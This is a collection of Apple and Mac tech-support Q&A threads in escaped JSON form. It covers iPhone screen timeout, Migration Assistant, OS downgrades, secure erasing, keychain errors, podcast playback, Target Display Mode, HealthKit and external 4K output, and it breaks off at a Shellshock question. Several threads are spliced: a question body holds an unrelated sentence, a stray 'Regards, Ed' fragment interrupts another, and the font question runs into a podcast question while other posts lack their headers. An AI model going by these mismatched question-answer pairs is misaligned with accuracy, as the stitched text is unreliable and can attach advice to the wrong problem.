screen lit.\n\n*keeping a finger on the screen within the notification display area (near or on the actual notifications) AND moving the screen slightly up and down or physically sliding your finger side-to-side every few seconds will keep the screen lit. \n\n*keeping a finger on the screen near the left or right edges of the lighted screen AND moving the screen slightly side-to-side every few seconds will keep the screen lit. Physically moving your finger up and down or tapping the screen in this area will not work.\nBottom line : the best solutions to keep the screen lit in order to read notifications appear to be to press the volume buttons or use a finger near the left or right edge of the screen as described above. For me personally, placing my right thumb in the bottom right part of the screen and slightly moving the screen side-to-side keeps the screen lit while I use my left thumb to scroll through the notifications.\nHope this helps:)\n\nA: I have accidentally found that pushing the on/off button exactly as the lock screen is dimming will keep the lock screen lit. No idea how long it stays on but doing this does prolong lock screen. It lasts at least 6 minutes and possibly forever. I am on iPhone 7. No idea how to set a timer for it though.\n\nA: Could not find Auto-Lock, search box took me to Display & Brightness and it's there.  You can set to 2, 5, 10,or 15 minutes, or Never.\n\nA: For those still searching for a workaround for this, you can also slide the display up or down with your finger to extend the display.  That is, after you \"wake\" the device and see your notifications, put your index finger on the display and slide it up (or down).  Each minimal \"scroll\" of the screen resets the countdown timer back to 5 seconds, I believe.\n\nA: I know of two ways (I use iPhone 6s plus):\n\n\n*\n\n*Once you are in the locked screen you may press the volume button in intervals of few seconds as long as you want the screen to remain on.\n\n*You may alternatively slide to get your widget screen (that is on the left, right side is camera). You need to remove all items from the widget first. This will not stop the timeout but it will do two things differently. First, it doubles the timeout interval from 5 to 10 seconds and second, after 10 seconds the screen goes dimmer instead of abruptly locking it which gives you time to react.\n\n\nA: iOS settings > general > Battery > low power mode > off\niOS settings > general > Auto lock\n\nA: You can only do it after jail breaking else it's not possible. \n\nA: iOS 8\nSettings > General > Auto Lock\n\nA: Pressing the on/off button as the screen begins to dim is indeed the solution to this \"irritation,\" as first suggested by Wdtony. I just got the iPhone 7 Plus, on which the lock screen dims about two seconds faster than on my iPhone 5, by my \"one-one-thousand\" reckoning. This also works for the iPhone 5, so presumedly, it also works for the \"6\" line of iPhones. \n", "Q: How to migrate to a brand new Mac from a more-recently-updated Mac? I just bought a new 15\" MacBook Pro, brought it home, followed the Migration Assistant instructions on my old 13\" Retina MacBook Pro running Mavericks (which explicitly say to install all software updates on the source machine before migration; I did so, including an OS X update), powered on the new computer, and when prompted to do so connected the two via Ethernet (using two Thunderbolt adapters; I do not have a Thunderbolt-to-Thunderbolt cable).\nThe old Mac appeared on the new Mac's migration screen, but with a warning sign over its icon. When I clicked it, I got:\nThis source contains a newer release of OS X. Your Mac requires an upgrade before you can migrate from this source.\nI've found sources saying this can happen when you upgrade to Yosemite, but I have not done so. I'm just running Mavericks, up to the newest software update. So I assume the issue is that the old Mac is running a newer Software Update.\nHow can I proceed with Mac-to-Mac migration? I would like to avoid having to purchase new equipment if possible; is there some way to update the new Mac even though I haven't set it up yet?\n\nA: It's quite likely the new MacBook is running OS X 10.9.4 or older, depending on how long it was built prior to shipping and purchase. In this case, you'll want to create a throwaway account on the system to set it up and use Software Update to bring the system up to the same patch level as the old one from which you're migrating.\nAfter you've updated the system, you can run the migration wizard and import your profile and apps. After that's done, make sure the new account has administrator rights and then you can log out of the throwaway account and delete it.\nAlternative method: If you have access to another Mavericks-compatible Mac, you can login to the App Store on your Apple ID and download Mavericks. Then use DiskMaker X to create a bootable USB (use an 8GB stick). Then do a fresh installation of Mavericks from that. The version of Mavericks from the App Store is 10.9.5 currently.\nAlternative method 2: Do an Internet Recovery with the MBP: http://support.apple.com/kb/HT4718\nNote that either of the installation processes will require you to go into Disk Utility and erase the volume to which you wish to install the pristine OS. If you don't erase the volume first, the installer will merely upgrade the volume, not replace it. NOTE: Do not erase the Recovery Partition; otherwise you'll be unable to do an Internet Recovery.\nInternet Recovery should download 10.9.5*, giving you version parity with your updated system.\n\n\n*\n\n*It's possible that if you overwrite your existing 10.9.4 that Internet Recovery will install the same version. I am unsure of how IR will work in an overwrite mode versus clean install.\n\n", "Q: Revert back to Mavericks from Yosemite Public Beta I have downloaded the Mavericks OS X Installation and found out it did not work.

I ran into lots of performance problems on the way. I would like to go back to Mavericks.\n\nA: There is no such thing as beta software without problems.\nRestore your system from a Time Machine backup taken before you installed the beta OS release. This is possible by booting into the Recovery Partition.\n\nA: As you were informed when installing the Yosemite preview, it is not possible to downgrade to Mavericks.

Kindly confirm please? I have a 13 inch MacBook Pro (10.5.8 OS X - I think it's called Leopard). I do NOT have the installation CD - so I cannot reinstall the OS and thus ensure that I have securely deleted everything from my hard drive. By looking at the o/p from the System Profiler utility, I'm pretty sure my hard drive is NOT a SSD, although I cannot confirm this.\nThe reason I can't directly use the \"Erase data\" option under Disk Utility is because the 'Security Options' (as well as the volume format) button is greyed out. Volume format currently reads 'Mac OS Extended (Journaled)\nI'm planning to securely delete ALL data on my mac using the following steps:\n1) Using Disk Utility, I click the button titled \"Erase Free Space\" using a one pass method (or if I have time 7 pass method) \n2) Once the above operation is complete, I plan to use 'secure rm' or 'srm' to remove all files and applications on my macbook.\n3) Once step 2 is complete, I re-run \"Erase Free Space\" using whatever method I used in step 1 above (in order to remain consistent)\nOnce step 3 is complete, I assume that my macbook has been formatted and all data securely deleted. Could you kindly confirm whether this assumption is true or not? If not could you please point out steps I need to add to my existing process? \n\nA: You will not be able to erase the entire contents of the disk, format/remove the partitions (securely or otherwise) while the volume is mounted. Because of this practical limitation, without having your original installation disc from which to boot into Disk Utility, you're stuck with a system that is in a vulnerable state to sell. While you can create a throw-away admin account from which to securely delete your user profile, OS X still splatters information, such as network connections, all over the place.\nAs Buscar correctly stated, the resale value on what I would I imagine is a circa 2008/2009 system is low enough already WITH all the original discs. Without them, the possibility of selling is fairly low. The biggest reason for this is that you need the original discs for running diagnostics. Apple Diagnostic software is mated to the particular hardware.\nAlthough Apple no longer supports these systems and, therefore, does not sell replacement DVDs, you can purchase recycled installation DVDs from ifixit.com. I purchased original Leopard install DVDs from iFixit for an Early 2008 MacBook4,1 that was gifted to me without discs. Highly recommended.\nWith the correct DVDs, you can securely erase the HDD and let go of the system with complete confidence. Alternatively, you may consider simply replacing the HDD in the system with a new one and destroying the one you've been using. Your out-of-pocket cost is probably around the same, but the original DVDs would likely net you a higher resale value.\n", "Q: Where does the OS X routing table come from? Trying to find out where the initial routing configuration for OS X is stored (plist, or wherever), and what happens at startup to read that configuration and configure the network interface(s).  \n\nA: In OS X, the routing table is mostly managed by configd, based on the network settings in /Library/Preferences/SystemConfiguration/* and the live status of the network interfaces (e.g. is there something plugged into the ethernet jack at the moment?).\nThe network settings can be examined by looking in /Library/Preferences/SystemConfiguration/preferences.plist, but the format is very hard to understand; I recommend using the Network Preference pane, or the networksetup command to view & change settings.\nThe routing setup itself is pretty simple: each configured interface gets a route to its local subnet, and for destinations not on any of the local subnets, a default route is set based on the \"Router\" setting for the highest-priority \"live\" interface (see the order of the interfaces in Network prefs, or use networksetup -listnetworkserviceorder and then look for the first \"live\" interface on that list).\nStarting in 10.6, things got a little more complicated, because Apple added source-based default routes for the defined routers of all interfaces. Essentially, this means that if traffic from a particular IP address comes in on an unexpected interface, it'll be replied to through the router defined on that interface.\n", "Q: iPad's Apple ID did not reflect the change I made on and now I can't turn off Find my iPad So this is quite a headache already. I'll lay out what I've done chronologically:\n\n\n*\n\n*Not knowing that the Apple ID is still in use on a device (iPad), I've changed the associated email address on the Apple ID website.\n\n*The Apple ID is now associated with the new email address\n\n*I completely forgot this ever took place.\n\n*The boss approaches me, asks for the password of the Apple ID. \n\n*I forgot the password, so I reset.\n\n*No email came through\n\n*Checking Safari for saved password, found it.\n\n*Did not work\n\n*Found a similar password associated with a different email address\n\n*Suddenly remembered the change of ID\n\n\nNow, for the questions:\n\n\n*\n\n*Why didn't the iPad reflected the change I made regarding the email? This could've solved my problem, but it became stuck with basically a non-existent Apple ID.\n\n*Why can't I add the old email address as an alternative, or re-associate it with the Apple ID?\n\n*What do I do next? The iPad is associated with a non-existent Apple ID, and I can't turn off the Find my iPhone.\n\n\nI hold you can help me with this issues.\n\nA: I just went through this mess, almost the exact same steps (minus the boss asking). In my case I had forgotten about the iPad being logged in to the same account and did not turn off findMyiPhone on it before changing the appleId.\nWhat worked for me finally, I found here apple's KB.\nLog out of iMessage on the iPad, and the log back into iMessage making sure to use the NEW appleId email address.  Next go to settings and turn off FindMyiPhone, you will be prompted for a password and the old appleid will still be displayed in the request, use the password for new appleid that you just used to log in iMessage, and it will turn off find my iphone.\nOnce find my iPhone is off, you can log out the account completely, and update the email address.\n", "Q: When i try to install my certificate in keychain, the error says: Unable to import - Error Code 25294 I am using the 10.9.5 version and ios 8. When i try to install my certificate i got through my developer account for push notification for my app in the keychain local items, its not importing. The error says: Unable to import the certificate and the error code is 25294\n\nA: Instead of double clicking the .cer file and importing in finder I just drag & dropped it into the Keychain app in the desired keychain, that worked for me.\n\nA: The error code means \"No such keychain\":\nerrSecNoSuchKeychain -25294 The specified keychain could not be found.\n\nI'm not really sure on how to proceed, but maybe this information points you in the right direction.\n\nA: Try adding the certificate to the \"login\" keychain.\n\nA: I'm really not sure about what you're question is asking, but I stumbled here while trying to solve the same error. The situation I had on my machine was I had a bunch of similarly named keychains in keychain access and the application would default to adding the .pem to a nonexistent keychain.\nSo I solved this by selecting the missing keychains one by one and deleting them all except my real System keychain, iCloud, and login. You might not have iCloud depending on your setup, version, and location.\n\nA: I worked around this error by adding the certificate to the login keychain by drag and drop.\n\nA: I solved this error by deleting old certificates from Keychain, then try to install certificate by double click.\n", "Q: Downgrading from 10.9.5 to 10.9.4 New to the forum. \nI wonder if it's possible to downgrade OSX to 10.9.4. I have a time machine backup running regularly and have also downloaded the previous version from apple website http://support.apple.com/kb/DL1755. I did not clone my disk before upgrading to 10.9.5 and don't have another installers apart from the one downloaded from apple website. There is mixed information available on this topic, some suggesting it's not possible at all to revert back to previous version at all. I would be grateful for detailed instructions on how to do this. Thank you\nI have learned my lesson now not to upgrade so quickly and wait for other users to beta test for me.  \nThank you in advance for looking into this. \n\nA: First of all, what you downloaded was only the service pack and not a full installation of 10.9.4. This means that you have no means of installing it directly. That said, even if you do manage to get 10.9.4 installed, you will not be able to migrate your profile from your Time Machine backup because the Migration Assistant can only migrate from older or equal OS versions. Which means you can go laterally or from older to newer, but not from newer to older.\nIf you have an up-to-10.9.4-specific Time Machine backup that you've archived, you may be able to use that to do a complete system restore, including your profile and applications, but you would then be looking at the likelihood of losing changes to your profile in the meantime. It may be possible to manually copy things to mitigate the damage, but I'm not sure how successful that would be.\nYou will probably get more mileage out of asking questions on how to fix problems that were brought about by installing 10.9.5 rather than try to revert to 10.9.4. YMMV, of course, but that would be my approach.\n", "Q: Cinema HD Display (DVI) is not turned on is connected to Macbook pro (2013) I have a macbook pro retina 13 inchs late 2013, os x 10.9.4\nI want to use a Cinema HD as external monitor.\nCinema HD uses a DVI interface.\nIf i connect my macbook to the monitor, Cinema HD is recognized but it is not turned on.

Requires a connection to USB port for functionality.  \nRegards, \nEd \n\nA: Are you using the correct display adapter for the Cinema HD? To the best of my knowledge, you'll need the Mini DisplayPort to Dual-Link DVI Adapter:\nhttp://store.apple.com/us/product/MB571Z/A/mini-displayport-to-dual-link-dvi-adapter\nIf you're just using the Mini DisplayPort-to-DVI adapter, that would probably explain the symptoms you're seeing.\n", "Q: What 4k video editing programs are available? So far I've dabbled in video edition with consumer tools from Apple like various versions of iMovie and occasionally using external programs like ffmpeg or Handbrake for conversion. Now I'm looking at 4k video edition but iMovie doesn't seem to support video of such resolutions (or whenever I import it it always comes in 1080p). It also seems that with the recent iPhone 6 announcement Apple still doesn't want to jump into 4k video recording, so it's not surprising iMovie doesn't handle it at all.\nWhat non linear 4k video edition tools are available? Do I have to jump to professional tools like Final Cut? I considered iMovie's ease of use adequate and feel uneasy about purchasing Final Cut because a search for it shows dozens of courses, implying it has a long/difficult learning curve.\n\nA: I can't answer your first question properly, because there are many 4K tools and you have to check yourself, which you like most. I personally like Final Cut Pro X much. But that depends on your needs.\nNow to your second question:\nWell, as far is I know, there isn't a 4K video editor for consumers, because normally, this user-group doesn't need 4K. So yes, you need to switch to pro-tools like Final Cut Pro X etc. \n", "Q: Accidentally dragged a font's typeface out of the font dialog and \"deleted\" it When I was trying to change the font in my xcode, I accidentally dragged a typeface out of the dialog with the mouse, causing the typeface to disappear from the fonts dialog forever.\n\nAs you can see, Menlo Regular is gone, (Italic too, because I couldn't help myself, damn me) I can't select it anymore.

I am having an issue where certain podcasts in a location with no internet access (see \"no service\" on the upper left). It  looks like they have been downloaded based on the fact that:\n\n\n*\n\n*There is no cloud to the right\n\n*The blue dot is on the left\n\n\nbut when I click to play then, they are not available.  \nAs an example, in the image below, look at the podcast \"Choosing a Javascript Framework . . .\" as in the image below:\n\nit looks like it has been downloaded (versus the second podcast below that clearly shows it needs to be downloaded)\nbut when i try to play that first podcast episode, I get the following error:\n\nSaying that \"this episode is temporarily unavailable . . .\"\nDoes anyone know what could be wrong here.  Its happening to a significant number of different podcasts so I have eliminated the possibility that this is some \"quirk\" with a specific podcast that happened to have a corrupt download.\n\nA: I am using an iPhone 5S with the most up to date iOS software (9.2.1 currently) and having the same error.\nI called Apple Care to get an answer on this - as I'm having the same issue. Downloading podcasts then when trying to play them I get the error message \"Episode temporarily unavailable\", even ones I have downloaded and played previously. I also didn't think the approach of having to download a podcast twice is an appropriate solution - even this doesn't always work.\nThe main Apple Support person I spoke with contacted the Apple iTunes Support department. They provided the following comments:\nIt isn't the player that is causing the issue its the third party providing the podcast file. The issue is that with new software updates to the iPhone or iPod the podcast files must also be updated.\nApparently part of the podcast download file needs to be re-written in order to be compatible with the newest Apple software update.\nThis doesn't really make sense as music files don't need to be updated everytime there is a software update (that I'm aware of anyway).\nI called them back in order to try and delve a bit deeper into this issue.\nI got a Senior Advisor on the phone - they checked my IMEI number and software version which seemed to be fine.\nI got them to download the same specific podcast that I was having the issue with and they were able to play the one that for me was \"unavailable\" even though it is downloaded locally.\nWe ended up resolving it by deleting all the podcasts from Storage (Settings>General>Storage & iCloud Usage>Storage>Manage Storage>Podcasts)\nand also Reset>Reset All settings (this will mean you lose all your settings - this didn't really affect me - just meant I had to put in my wifi password back in, reset my wallpaper and my alarm clock).\nHopefully this works for you - I asked that the Apple Advisor I spoke to pass this information onto the team at Apple that works on the Podcast app - hopefully they will be able to push an update to the app that makes this resolution process obsolete.\n\nA: This is a wide spreaded problem. If you check the ratings of the Podcast-app in the App Store, they are at around two stars. I don't know if apple doesn't fix this bug, but at the moment, there is no easy fix for that problem. \nThe only fix would be, that you download the podcasts from your Computer and sync it to your iPhone. But maybe even that way, it won't work because the app itself is the problem. So you could download a music-player from the app store which allows to play music which you added via iTunes to the app before.(App-Tab on itunes and than drag and drop the podcasts to your music-player) or you could try to add it to your music-library and play it with your standard iPhone-player.\n\nA: If you add them to \"Play Next\" then use the drop down list to the right, looks like 3 short lines they will all play in the order you arranged them. \n\nA: I don't know why it happens but the way I fix it is by deleting the episode (deleting it and also deleting the download) and downloading it again. \n\nA: I noticed that I only started to get this problem after I started using WiFi. Previously i'd been using only 4G cellular internet and never saw this problem. I'm talking like for 6 months. But soon as I had both cellular & wifi on it started happening. So i think it may be a bug where the 2 networks are getting confused somehow.\n\nA: Delete the podcast app and re download. Fixed. \n\nA: So I'm not a tech person but I did find out a solution to my ongoing error. \nMy phone is set up not to download podcast on cellular data. \nThis is gonna sound stupid. But when I'm at work and my phone thinks it's connected to the Internet but I haven't entered the password, the WiFi symbol still shows, the podcast tried to download but doesn't. That's when I get the error. \nOnce I connect to the WiFi, I delete the podcast and reinstall it, it plays. \nI've had this issue for months and could never figure it out until now. \nI guess,  make sure you are connected to the Internet. \nThe podcast shows its downloading but it's quick. It doesn't show that it's not fully downloaded or partially downloaded. It just gives me the error it's not available. \nI hope this helps some people. \nI will add when I tried adding it to the play next, it wouldn't play. \n\nA: This is a Apple iOS podcast app issue not the source of the podcast. It means that the download was not handled by the app properly.  What do you usually need to do when this happens is delete  the episode from the Podcast feed ,\nThen refresh the feed and choose download from the right \"dots\" menu and when it finishes downloading it will be ready to play.   \n\nA: I found this problem can occur when the enclosure url in the feed is a redirect. Redirect urls are used automatically by some feed generators in order to collect stats, e.g. the Sermon Browser Wordpress plug-in does this. I fixed it by modifying the code to insert a direct link to the file instead.\n\nA: Just tried many of these fixes and no luck. Finally, I downloaded another podcast app from a third party and it worked fine... even with the feed I couldn't play in Apple's app. \n\nA: I turned off WiFi and it started working. It was the whole of one podcast that just wouldn’t play for weeks.\n", "Q: can't connect two hard-drives to my airport I have two seagate usb 3.0 4tb drives full of music that I want to access wirelessly. I have my Bites USB 3.0 hub powered by DC 5V cord. I want to connect these to my airport extreme (5th gen), but there's a problem. \nWhen I connect the whole thing to my airport, it says that the hard drives need to be repaired. When I connect them (via usb hub) to my Macbook Air, it can only see one hard drive at a time (the first connected), but all of them work (as if they're not broken, my Mac sees both when I plug them directly). So obviously - there's something wrong with the usb hub. But what exactly? How can I fix this? \n\nA: If the USB hub is bus powered (it doesn't have to plug in to a wall socket) then the problem is that your Hard Drives are drawing too much current. USB Standards state that each USB port needs to be able to output 500mA. \nWhen you divide that by four (assuming your USB hub is 4-port), you get 125mA, which isn't nearly enough to power two hard drives.\nI suggest you get a externally powered USB hub (one that requires a power supply other than USB), as that will ensure that each USB port receives 500mA each.\n", "Q: How to drag the last Safari tab to another window? When I have five windows open and want to consolidate two windows into one I usually manually drag & drop all tabs from one window to the second one. The issue is that you can’t drop the last tab onto another window.\nMy current workaround is to create a new (empty) tab, to drag & drop as usual, and then to close the window with that empty tab.\nIs there a way to drag the last tab in Safari to another window like in Chrome or do I have to continue using my workaround?\n\nA: In Safari, one can move even the last tab of a window into another window simply by clicking on the tab's title area and then dragging and dropping onto the tab space of your target window. Dragging the last tab to a new window causes that window to close.\nThis is what it looks like to move the last tab, which I had opened at Top Sites.\n\nThat is actual size. The window 'collapses' during the drag operation and becomes semi-transparent.\nThe requirement is that View | Show Tab Bar is selected when the window is open with a single tab. This setting is sticky; it will 'stick' between Safari sessions.\n\nA: In Safari 8 on Yosemite you can drag the URL (or rather domain name) and drop it onto the plus sign which usually opens a new tab in another window. This way you can move the last tab from one window to another one.\nI believe that previous versions just loaded the dropped URL in the active tab, replacing the tab’s contents. In Safari 8 you can still reproduce this behavior by dropping the URL onto a tab instead of the plus sign in the tab bar / toolbar.\nThe thread “Is it possible to convert window into tab?” is slightly related to my question.\n\nA: A really simple way to achieve what you wish to do without the tedious task of dragging tabs to other windows is to go to the Menu Bar, then the Window menu, then select Merge All Windows.\nIf you want to keep using your own method, go to the Menu Bar, go to View, then select Show Tab Bar.\n\n", "Q: How To Delete A Large Video File From iOS Device Which Does Not Show Up in Photos? I have a large video (18GB) on my iPad that I deleted, but somehow did not actually get deleted off the device.  It is not visible on the iPad itself but I can see it through any iOS file browser (iMazing, IBrowse, IExplorer)... just can't seem to delete it with these.\nIt shows as 'Other' space being taken up, and I cannot update the device now, because is is full.  I could restore the device to factory, but I don't want to lose all my other apps.  Restoring from backup now would just give me the offending file back, I believe.\nHow to rid myself of this file?\n\nA: In the Photos app, select the Albums view and you'll see a Recently Deleted album there. Deleting the video from there will free the space for you. If you're not hurting for space, you can leave them and they'll be cleared from the device after 30 days. Each photo/video in the album is shown with the remaining countdown before the media is permanently removed by the OS.\n", "Q: Powerful manager of default applications? I would need a powerful way to open default applications. Not only to register them to extension/mime type (like duti), but also to be able to change default application depending on the asked resource.\nFor example, my default url application is Chrome. But I want to open Safari if URL link contains some specific word (e.g. related to my work or other project).\nIs there any application on Mac that can help me with this? Thank you!\n\nA: I don't believe there is one app to do what you want, but a combination of the following should do it.\nRCDefaultApp is the old stalwart of extension/mime/creator code and many other types of mappings. In the transition days between Mac OS 9 and X, I used this extensively to deal with all of my files with Type and Creator Codes. \nFor more complicated file opening control try Magic Launch which can select the app to use based on currently open apps, file path, file contents, tags, etc. \nThis still doesn't give you control based on URL. For web addresses try Choosy, which gives a nice interface to select the browser at time of clicking on a link or via automatic rules based on strings, regex, and more. \nNote: I don't currently use any of the above. For selecting which app to open a file, I use LaunchBar's ability to specify which app to open a selected file.\n", "Q: How to transmit my PC onto my iMac? I use tiny 13'' Windows laptop for work and whenever working from home would like to use my 27'' iMac as a display to it. \nIs this possible? Would HDMI->Thunderbolt cable do the trick? Is there anything more required?\n\nA: You cannot transmit the output of your Windows screen through an iMac display, but there is one way to work that you may find quite appealing: Microsoft Remote Desktop.\nMS has a remote desktop client application that is a free download from the App Store. On your Windows machine, you change System preferences in Control Panel to enable remote access. In the Remote Desktop app on your iMac, you create a machine profile that specifies the Windows computer name or IP address, your account username and your password. It supports fullscreen mode, so your Windows login will be plenty big on your 27\" display.\nI use the application daily to remotely administer Windows desktops and servers all over the country. From the comfort of my MacBook.\n\nA: Depending on the model of your iMac, you can use the mini-display port as an INPUT and change the imac into monitor mode to use it as an external display. \nThis IS compatible with any Operating System, as long as the graphics adapter can support the resolutions that the iMac can support. \nThis feature is called Target Display Mode, and can be accessed by pressing COMMAND-F2 on your keyboard once the cable is connected. \nHere is Apple's notes about it:\nhttp://support.apple.com/kb/HT3924\nI use one of these to connect to my gaming PC, connected to a DVI cable. \nhttp://store.apple.com/us/product/MB570Z/B/mini-displayport-to-dvi-adapter\nGood luck! \nEd\n\nA: I would suggest that you go with Trane Francks' answer to use Microsoft Remote Desktop. RDC is one of the crown jewels of Microsoft. It is so much better that VNC. I wish my Mac's and Linux systems had RDC. (Well, Linux does have X11, which is close.) Using RDC over a fast local network will feel almost like being directly on the computer. You may not even notice if you are running Office type applications. The only exception is things like video and games, but even here I have been often surprised at how well RDC works.\nHowever to directly answer your question, a 27\" iMac can be used as an external screen, but only with other Thunderbolt systems which limits this mostly to other Mac's. A HDMI to Thunderbolt converter will not work. (Unless, someone has recently created a much smarter adaptor.) Apple calls this \"Target Display Mode\" which is only available on 27\" iMac's. Pre-Thunderbolt systems used Mini DisplayPort and were much easier to use with other systems. \nA great explanation:\nhttp://www.tekrevue.com/tip/ins-outs-imacs-target-display-mode/\nAnd Apple's own docs: http://support.apple.com/kb/HT3924?viewlocale=en_US&locale=en_US\n\nA: There is solution for Windows 10 - \"Screen Mirroring\"\nYour Target iMac should run Windows 10 thru Bootcamp and you have to change a few settings on the receiver computer:\n\n\n*\n\n*Open Settings and then open System.\n\n*Scroll down to find ‘Projecting to this PC’ in the left menu.\n\n*From the first drop down menu select, ‘Available everywhere’.

Be sure that if you're using a non-standard editor that you're saving in UNIX format. If you accidentally do things with DOS CRLFs, that can trigger command not found errors.\nAnd just on the off chance that you've nuked your ~/.bash_profile, i.e., you absolutely don't have one anymore because you deleted it:\necho \"\" >> ~/.bash_profile\n\nThat is an odd one, but I've seen at least one guy claiming that command not found issues were fixed by creating a missing .bash_profile.\nFinally, note that if you do not wish to give a full path to the executable that you're running, e.g., ~/Downloads/myScript.sh, you need to either place the executable somewhere in your existing path or you need to modify your path to point to the directory in which your executables are stored.\n\nA: I suggest you run this command, it should re-build the PATH variable.\n/usr/libexec/path_helper\n", "Q: How does HealthKit resolve recording of the same activity by multiple sources? What happens when more than one \"source\" registered with HealthKit tracks the same activity? \nFor example, if I have Human tracking my activity in general, and then use Cyclemeter (which supports HealthKit in version 10.3) to track particular bike ride, both will (I assume) submit the same activity to HealthKit. Presumably it should be possible for HealthKit to recognize that these activities are likely duplicates and at least ask me how to resolve the \"duplication\" (much as sync conflicts are resolved). In fact, the activities contain enough data that such recognition should generally be possible to perform automatically.\nDoes HealthKit do this? Does it resolve duplicate recordings of the same activity (either automatically or semi-automatically)?\n\nA: As far as I researched the answer of Paul Veugen is only partially true. HealthKit does merge this Data if you use a HKStatisticsQuery or a HKStatisticsCollectionQuery. Otherwise it will be up to you, to provide a logic to merge/deduplicate the results. \nOne possible solution might be to use HKSourceQuery to Identify different sources and e.g. only select one.\nAnother might be to access the source via HKSourceRevision in the results of an HKQuery and only take the data from one source or try to compare data from the different sources. From iOS 9.3 there is also the possibility to access the different source devices using HKDevice.\nTaking one device will always leave you with the possiblity, that an user did partially not use the device during the requested timespan, what will lead to missing datapoints. \nBecause of this priorising results will still remain painful, as Apple did not document, if the requested data will be sorted by the user defined source priority in Health. \nSaying this, it might be worth looking into overlapping date ranges to identify duplicates.\n\nA: HealthKit is pretty smart with your data. For every source in the Health app, you can set the priority of difference apps. Tap one of the metrics in the Health app tap Share data > Edit to drag sources in the right order. \nIf other apps request data, HealthKit will automatically merge the datasets, probably based on timestamps. It picks the high priority app first, and fills the gaps in data with the number 2 app, etc. \nThis WWDC would be a great start to get a complete overview.\n", "Q: IPSec/L2TP Unable to connect When attempting to connect to my StrongSwan server I'm getting getting an error message saying the server did not respond.  However, looking in /var/log/system.log shows that it is responding but that the system isn't able to open /etc/authorization.\nMy understanding, as a Mac noob, is that /etc/authorization is deprecated in Mavericks which is what I'm running here.\nAlso, the connection is set up through the native Mac networking tool, the certs are loaded in Keychain Access, and I'm using IKEv1.\nUnfortunately as I noted, I'm a Mac noob and not sure where to start my search on correcting this error.  What I've found so far are just posts about how Mavericks has deprecated /etc/authorization, but not what to do if for some reason an application is attempting to use it.\n\nA: After much searching I found the answer at http://www.henrywang.org/entry/mavericks-and-cisco-vpn (Warning : Written in Chinese you'll probably need to translate it.).\nTL;DR The private key needed to be set to \"Allow all applications to access this item\" in  Keychain Access.\n\nA: I don't know if they exist, but you could try using a third-party VPN client.\nUpdate: Viscocity from SparkLabs looks like it would do the job.\n", "Q: How to create third partition on a Mac with Mavericks and Bootcamp? Right now I am running OS X 10.6.8 (Snow Leopard) on my MacBook Pro, with Windows 7 via Boot Camp, and I also have a third FAT32 partition where I share data between Mac/Windows. \nI am going to upgrade to Mavericks. I Googled and it seems Mavericks is not going to be happy with letting me create the third FAT32 partition.\nDid anyone create a third partition with Mavericks before? What are the steps?\n(I have backed up all my data from both OS X and Windows, and I am going to format whole hard disk, and fresh install snow leopard, then update to Mavericks).\n\nA: Wait, before you do that, you can do this in an easier fashion. \nJust shrink the Mac partition via Disk Utility and format the new free space as FAT32. \n\nA: The process for creating an extra partition in Mavericks hasn't changed much since Snow Leopard, so you should be able to create a partition using Disk Utility the same way you did in Snow Leopard.\n\nA: I had the same config in my Lion but now with the new mavericks I tried it twice:\n1) installed WIN7 and then reduced the Macintosh partition before creating a 3rd partition in disc utility. Result: Bootcamp not bootable anymore but the other 2 partitions worked fine\n2) same same except that I now let disc utility devide the macintosh partition. Result was also same. \nStill looking for the answer. I think my next step will be partition magic or the like. \n", "Q: Trying to re-format via internet recovery, no entry sign I am trying to reformat my MBP 13\" late 2012 as I've sold it on eBay. I have KnowHow support from PC World and they're absolutely useless and just the most arrogant people I've ever spoke to in my entire life. Anyway enough about that...\nI was told to press CMD + R to start the recovery process on reboot, it comes straight up with internet recovery where it downloads and after that is complete it just comes up with a No Entry symbol for about 5 minutes then restarts and just asks me to login. I've rebooted and held down alt (option or whatever it's called) and I can see the recovery partition and when I select it, it will not load and asks if I want to restart. I've downloaded OS X Recovery Disk Assistant v1.0 to a portable hard drive and it does the exact same thing, it will not load the recovery assistant.\nDoes anyone have any ideas? Pretty much needed to get this shipped off today.\n\nA: The fastest method around a sticky recovery partition is to just boot your Mac in target disk mode and connect it to another Mac and have that OS run Disk Utility to erase / zero the drive.\nAt that point, you should have far less issues reinstalling the OS in recovery mode. Depending on the agreement you had with the buyer, you could just send the Mac to them with a wiped drive and let them sort out the reinstall since then their Apple ID will be associated with the upgrade / app store instead of yours.\nTo diagnose why your Mac isn't starting will likely require access to the install logs and/or system logs.\n\n\n*\n\n*Can you boot the Mac into single user mode and get a usable prompt?\n\n*Can you boot holding the option key and then select your Recovery HD to get Disk Utility to run and zero the main partition/volume?\n\n", "Q: MacBook Pro with Retina display (Late 2012) not outputting anything above 1080p I know it won't support 4k but it should at least do 1440 right? I can't get higher than 1080p...\n\nUPDATE:\nI pressed alt and clicked \"scaled\" to unlock the extra resolutions as suggested by Buscar웃. It gives me more options but onfortunately still nothing higher than 1080p :(\n\nThis macbook is quoted as supporting \"up to 2560 by 1600 pixels on up to two external displays\" and it does so with the thunderbolt cinema display. Surely it should be able to do the same with my new 4k monitor? If it matters, the display I'm using is the AOC U2868PQU. I'm not using \"mirroring\" as suggested by LaX.\n\nA: I managed to get full 3840×2160 @30Hz using mini-displayport cable and an app called SwitchResX. Here are my custom settings, you need to reboot the machine to apply them:\n\nAs a word of warning, this does make things eye-bleedingly small. (Pretty cool though - full-size)\n\nPersonally, I found the ‘scaled’ resolution of 1920×1200 to be the best for me because it uses HiDPI to give you that retina feel you’re used to. It will look like 1920×1200 but actually use more pixels to paint it. Here are the settings:\n\nThis is much more sensible (although I would like it smaller to be honest).\nThe downside is that you lose some of the screen down the sides. Let me know if you have any better suggestions.\nIf you find the colours going a bit funny, I used SwitchResX to change the color profile to sRGB IEC61966-2.1 like this:\n\nFor more details, go to my blog post here: http://www.mattburns.co.uk/blog/2014/09/30/running-the-4k-aoc-u2868pqu-and-intel-hd4000-graphics/\n\nA: 1080p - The Resolution is 1920x1080 pixels, sent at 60 complete frames per second. \n--> Hold alt key before pressing Scaled to see all resolution supported.\nIf you use the \"Underscan slider\" it will allow you to get higher resolution at the cost of screen refresh rate. The reason we use 50/60 Hz refresh rate is the human eye can not see screen refresh (flickering). But if you are not watching movies ect...then running a 30 Hz will slow down the refresh rate, and give you higher pixel count.\n\nA: If your issue is about your TV being 4K and your Mac not allowing you to display higher resolution than 1080p, you have to first make sure you're not using screen mirroring. You have to expand the desktop to use separate resolutions. \nNow, if you still don't have the required resolution, you can try using the following script from GitHub: https://github.com/vinc3m1/mac-pixel-clock-patch\nIt'll remove any limitation your Mac might have about external displays.\n", "Q: Apple Shellshock patch for 10.6? I am running a small HTTP server 